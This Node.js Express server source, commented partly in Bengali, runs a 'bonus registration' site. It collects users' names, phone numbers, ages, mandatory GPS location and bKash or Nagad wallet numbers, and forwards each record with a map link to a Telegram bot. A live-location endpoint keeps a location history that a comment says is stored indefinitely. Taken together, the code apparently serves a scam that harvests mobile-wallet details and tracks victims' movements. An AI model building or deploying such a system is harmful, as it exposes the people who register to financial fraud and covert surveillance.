const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = Number(process.env.PORT || 3000);

// Default FallbackWarning সহ Production Checks
const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret-now");

if (process.env.NODE_ENV === "production") {
  if (ADMIN_PIN === "6123") console.warn("⚠️ WARNING: Using default ADMIN_PIN in production!");
  if (APP_SECRET === "change-this-secret-now") console.warn("⚠️ WARNING: Using default APP_SECRET in production!");
}

const DATA_DIR = path.join(__dirname, "data");
const DB_FILE = path.join(DATA_DIR, "db.json");

fs.mkdirSync(DATA_DIR, { recursive: true });

// Concurrency Race-condition ঠেকানোর জন্য Async File Mutex Lock System
let fileLockPromise = Promise.resolve();
function withFileLock(operation) {
  const result = fileLockPromise.then(() => operation());
  fileLockPromise = result.catch(() => {});
  return result;
}

function defaultDb() {
  return {
    registrations: [],
    usedNumbers: [], // ফোন নম্বর কখনো যেন রিপিট না হয় (Delete করলেও নয়)
    settings: { telegramChatId: "", telegramBotTokenEncrypted: "" }
  };
}

function loadDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const db = defaultDb();
      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      return db;
    }
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    return {
      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
      usedNumbers: Array.isArray(parsed.usedNumbers) ? parsed.usedNumbers : [],
      settings: {
        telegramChatId: parsed.settings?.telegramChatId || "",
        telegramBotTokenEncrypted: parsed.settings?.telegramBotTokenEncrypted || ""
      }
    };
  } catch {
    return defaultDb();
  }
}

function saveDb(db) {
  const tmp = DB_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}

function validPhone(v) {
  return /^01[3-9]\d{8}$/.test(String(v || ""));
}

function clean(v, max = 200) {
  return String(v || "").trim().slice(0, max);
}

function key() {
  return crypto.createHash("sha256").update(APP_SECRET).digest();
}

function encryptSecret(value) {
  if (!value) return "";
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key(), iv);
  const enc = Buffer.concat([cipher.update(String(value), "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptSecret(value) {
  if (!value) return "";
  try {
    const raw = Buffer.from(value, "base64");
    const iv = raw.subarray(0, 12);
    const tag = raw.subarray(12, 28);
    const data = raw.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key(), iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString("utf8");
  } catch {
    return "";
  }
}

function signSession(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
  return `${body}.${sig}`;
}

function verifySession(token) {
  try {
    const [body, sig] = String(token || "").split(".");
    if (!body || !sig) return null;
    const expected = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
    const a = Buffer.from(sig), b = Buffer.from(expected);
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
    const payload = JSON.parse(Buffer.from(body, "base64url").toString("utf8"));
    if (!payload.exp || Date.now() > payload.exp) return null;
    return payload;
  } catch {
    return null;
  }
}

function cookies(req) {
  const out = {};
  const raw = req.headers.cookie || "";
  for (const part of raw.split(";")) {
    const i = part.indexOf("=");
    if (i > -1) {
      out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
    }
  }
  return out;
}

function requireAdmin(req, res, next) {
  const session = verifySession(cookies(req).admin_session);
  if (!session || session.role !== "admin") {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

// Global System Wide Unique Check (Phone/Payment Number)
function isNumberUsed(db, num) {
  if (!num) return false;
  if (db.usedNumbers.includes(num)) return true;
  return db.registrations.some(r => r.phone === num || r.paymentNumber === num);
}

async function sendTelegram(text) {
  const db = loadDb();
  const token = decryptSecret(db.settings.telegramBotTokenEncrypted);
  const chatId = db.settings.telegramChatId;

  if (!token || !chatId) return { ok: false, skipped: true, error: "Telegram Config Missing" };

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok || !data.ok) {
      return { ok: false, error: data.description || "Telegram send failed" };
    }
    return { ok: true };
  } catch (err) {
    return { ok: false, error: err.message };
  }
}

// Admin Rate Limiter Lockout System
const loginAttempts = new Map();
function rateLimitAdminLogin(req, res, next) {
  const ip = req.ip || req.headers['x-forwarded-for'] || 'global';
  const now = Date.now();
  const record = loginAttempts.get(ip) || { count: 0, lockUntil: 0 };

  if (now < record.lockUntil) {
    const waitSec = Math.ceil((record.lockUntil - now) / 1000);
    return res.status(429).json({ error: `অনেকবার ভুল চেষ্টা করা হয়েছে। ${waitSec} সেকেন্ড পর আবার চেষ্টা করুন।` });
  }

  req.adminRateLimit = {
    success: () => loginAttempts.delete(ip),
    fail: () => {
      record.count += 1;
      if (record.count >= 5) {
        record.lockUntil = now + 15 * 60 * 1000; // 15 mins block
        record.count = 0;
      }
      loginAttempts.set(ip, record);
    }
  };
  next();
}

app.use(express.json({ limit: "100kb" }));
app.use(express.static(path.join(__dirname, "public")));

// Registration Step 1
app.post("/api/register/start", (req, res) => {
  withFileLock(async () => {
    const name = clean(req.body?.name, 80);
    const phone = clean(req.body?.phone, 20);
    const age = Number(req.body?.age);
    const lat = Number(req.body?.location?.latitude);
    const lon = Number(req.body?.location?.longitude);
    const acc = Number(req.body?.location?.accuracy);

    if (name.length < 2) return res.status(400).json({ error: "সঠিক নাম দিন।" });
    if (!validPhone(phone)) return res.status(400).json({ error: "সঠিক মোবাইল নাম্বার দিন।" });
    if (!Number.isFinite(age) || age < 18 || age > 100) return res.status(400).json({ error: "সঠিক বয়স দিন।" });
    if (!Number.isFinite(lat) || lat < -90 || lat > 90 || !Number.isFinite(lon) || lon < -180 || lon > 180) {
      return res.status(400).json({ error: "দয়া করে লোকেশন অন করুন" });
    }

    const db = loadDb();

    if (isNumberUsed(db, phone)) {
      return res.status(409).json({ error: "এই নাম্বারটি দিয়ে পূর্বে রেজিস্ট্রেশন করা হয়েছে।" });
    }

    const id = crypto.randomUUID();
    const createdAt = new Date().toISOString();

    db.registrations.unshift({
      id,
      name,
      phone,
      age,
      location: {
        latitude: lat,
        longitude: lon,
        accuracy: Number.isFinite(acc) ? acc : null,
        capturedAt: createdAt
      },
      locationHistory: [{ // অনির্দিষ্টকালের জন্য Tracking Records জমার অ্যারে
        latitude: lat,
        longitude: lon,
        accuracy: Number.isFinite(acc) ? acc : null,
        capturedAt: createdAt
      }],
      paymentMethod: "",
      paymentNumber: "",
      status: "awaiting_payment",
      createdAt,
      updatedAt: createdAt
    });

    saveDb(db);
    res.json({ ok: true, registrationId: id });
  });
});

// Live Location Stream Update API Endpoint
app.post("/api/register/:id/location", (req, res) => {
  withFileLock(async () => {
    const lat = Number(req.body?.location?.latitude);
    const lon = Number(req.body?.location?.longitude);
    const acc = Number(req.body?.location?.accuracy);

    if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
      return res.status(400).json({ error: "Invalid coordinates" });
    }

    const db = loadDb();
    const row = db.registrations.find(r => r.id === req.params.id);
    if (!row) return res.status(404).json({ error: "Registration not found" });

    const capturedAt = new Date().toISOString();
    const locObj = {
      latitude: lat,
      longitude: lon,
      accuracy: Number.isFinite(acc) ? acc : null,
      capturedAt
    };

    row.location = locObj; // Update Latest Location
    if (!Array.isArray(row.locationHistory)) row.locationHistory = [];
    row.locationHistory.push(locObj); // Store Indefinitely
    row.updatedAt = capturedAt;

    saveDb(db);
    res.json({ ok: true });
  });
});

// Payment Step
app.post("/api/register/:id/payment", (req, res) => {
  withFileLock(async () => {
    const method = clean(req.body?.paymentMethod, 20);
    const number = clean(req.body?.paymentNumber, 20);

    if (!["bKash", "Nagad"].includes(method)) {
      return res.status(400).json({ error: "bKash অথবা Nagad নির্বাচন করুন।" });
    }
    if (!validPhone(number)) {
      return res.status(400).json({ error: "সঠিক bKash/Nagad নাম্বার দিন।" });
    }

    const db = loadDb();

    const row = db.registrations.find(r => r.id === req.params.id);
    if (!row) return res.status(404).json({ error: "রেজিস্ট্রেশন সেশন পাওয়া যায়নি। আবার চেষ্টা করুন।" });

    if (isNumberUsed(db, number) && row.phone !== number) {
      return res.status(409).json({ error: "এই bKash/Nagad নাম্বারটি সিস্টেমে ব্যবহৃত হয়েছে।" });
    }

    row.paymentMethod = method;
    row.paymentNumber = number;
    row.status = "complete";
    row.updatedAt = new Date().toISOString();

    saveDb(db);

    const msg = [
      "✅ New Bonus Registration",
      `Name: ${row.name}`,
      `Phone: ${row.phone}`,
      `Age: ${row.age}`,
      `Payment: ${row.paymentMethod}`,
      `Wallet: ${row.paymentNumber}`,
      `Location: https://maps.google.com/?q=${row.location.latitude},${row.location.longitude}`,
      `Time: ${row.createdAt}`
    ].join("\n");

    const tgRes = await sendTelegram(msg);

    res.json({
      ok: true,
      telegramWarning: !tgRes.ok ? "Telegram Notification Failed" : null
    });
  });
});

// Admin Login Route
app.post("/api/admin/login", rateLimitAdminLogin, (req, res) => {
  if (String(req.body?.pin || "") !== ADMIN_PIN) {
    req.adminRateLimit.fail();
    return res.status(401).json({ error: "ভুল PIN" });
  }

  req.adminRateLimit.success();
  const token = signSession({ role: "admin", exp: Date.now() + 8 * 60 * 60 * 1000 });
  const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';

  res.setHeader(
    "Set-Cookie",
    `admin_session=${encodeURIComponent(token)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${8 * 60 * 60}${isHttps ? '; Secure' : ''}`
  );

  res.json({ ok: true });
});

app.post("/api/admin/logout", requireAdmin, (req, res) => {
  res.setHeader("Set-Cookie", "admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
  res.json({ ok: true });
});

app.get("/api/admin/registrations", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({ registrations: db.registrations, total: db.registrations.length });
});

app.delete("/api/admin/registrations/:id", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const row = db.registrations.find(r => r.id === req.params.id);
    if (row) {
      if (row.phone) db.usedNumbers.push(row.phone);
      if (row.paymentNumber) db.usedNumbers.push(row.paymentNumber);
    }
    db.registrations = db.registrations.filter(r => r.id !== req.params.id);
    saveDb(db);
    res.json({ ok: true });
  });
});

app.get("/api/admin/settings", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({
    telegramChatId: db.settings.telegramChatId || "",
    hasTelegramBotToken: Boolean(db.settings.telegramBotTokenEncrypted)
  });
});

app.post("/api/admin/settings", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const chatId = clean(req.body?.telegramChatId, 100);
    const token = clean(req.body?.telegramBotToken, 300);

    db.settings.telegramChatId = chatId;
    if (token) {
      db.settings.telegramBotTokenEncrypted = encryptSecret(token);
    }

    saveDb(db);
    res.json({
      ok: true,
      hasTelegramBotToken: Boolean(db.settings.telegramBotTokenEncrypted)
    });
  });
});

// Admin Telegram Test Endpoint
app.post("/api/admin/telegram/test", requireAdmin, async (req, res) => {
  const result = await sendTelegram("🔔 Test Message: Telegram Integration Successfully Configured!");
  if (!result.ok) {
    return res.status(400).json({ error: result.error || "Telegram message send failed" });
  }
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
